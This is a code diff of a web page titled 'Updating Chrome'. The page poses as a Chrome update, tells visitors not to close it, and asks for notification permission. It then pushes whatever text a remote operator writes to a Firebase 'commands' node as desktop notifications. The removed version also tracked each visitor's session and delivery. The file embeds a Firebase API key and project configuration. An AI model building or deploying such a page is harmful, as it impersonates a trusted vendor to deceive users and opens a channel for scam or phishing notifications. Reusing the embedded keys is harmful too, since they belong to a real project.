@@ -1,23 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Updating Chrome</title>
-  <meta charset="UTF-8">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
-    body { font-family: sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .box { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); max-width: 400px; text-align: center; }
-    h1 { color: #1a73e8; }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f1f3f4;
+      color: #202124;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      background-color: white;
+      padding: 2rem 2.5rem;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      max-width: 480px;
+    }
+
+    h1 {
+      margin-top: 0;
+      font-size: 1.75rem;
+      color: #1a73e8;
+    }
+
+    p {
+      font-size: 1rem;
+      color: #5f6368;
+    }
+
+    .status {
+      margin-top: 1.5rem;
+      font-size: 0.95rem;
+      color: #34a853;
+      font-weight: 500;
+    }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h1>Updating Chrome…</h1>
-    <p>This tab will auto-close.</p>
-    <p id="session-name">Session: Connecting…</p>
+  <div class="container">
+    <h1>Updating Chrome...</h1>
+    <p>This page will close automatically. Do not close manually.</p>
+    <div class="status" id="status">Waiting for notifications…</div>
   </div>
 
+  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
@@ -28,55 +67,33 @@
       messagingSenderId: "936289141781",
       appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    const status = document.getElementById("status");
 
-    const sessionLabel = document.getElementById("session-name");
-    let sessionId = null;
-
-    // Assign unique session name
-    db.ref("sessions").once("value", snap => {
-      const sessions = snap.val() || {};
-      let index = 1;
-      while (sessions[`chrome-${index}`]) index++;
-      sessionId = `chrome-${index}`;
-      sessionLabel.textContent = `Session: ${sessionId}`;
-      const sessionRef = db.ref(`sessions/${sessionId}`);
-
-      // Setup listeners
-      sessionRef.on("value", snapshot => {
-        const data = snapshot.val();
-        if (data?.title && data?.message && data?.id !== lastId) {
-          showNotification(data.title, data.message);
-          lastId = data.id;
-          db.ref(`deliveries/${data.id}/${sessionId}`).set("delivered");
-          sessionRef.update({ seen: Date.now() });
-        }
-      });
-
-      db.ref("broadcast").on("value", snapshot => {
-        const data = snapshot.val();
-        if (data?.title && data?.message && data?.id !== lastId) {
-          showNotification(data.title, data.message);
-          lastId = data.id;
-          db.ref(`deliveries/${data.id}/${sessionId}`).set("delivered");
-        }
-      });
-
-      // Keep alive pings
-      setInterval(() => {
-        sessionRef.update({ lastPing: Date.now() });
-      }, 10000);
-    });
-
-    let lastId = null;
-
-    function showNotification(title, message) {
-      if (Notification.permission !== "granted") {
-        Notification.requestPermission();
-      }
-      new Notification(title, { body: message });
+    // Ask permission for notifications
+    if (Notification.permission !== "granted") {
+      Notification.requestPermission();
     }
+
+    // Clear last message so only new ones trigger
+    db.ref("commands").set({});
+
+    db.ref("commands").on("value", (snapshot) => {
+      const data = snapshot.val();
+      if (data && data.title && data.message) {
+        if (Notification.permission === "granted") {
+          new Notification(data.title, { body: data.message });
+          status.textContent = "🔔 Notification received!";
+        } else {
+          status.textContent = "⚠️ Notification blocked by browser.";
+        }
+
+        // Clear the command after showing
+        db.ref("commands").set({});
+      }
+    });
   </script>
 </body>
 </html>
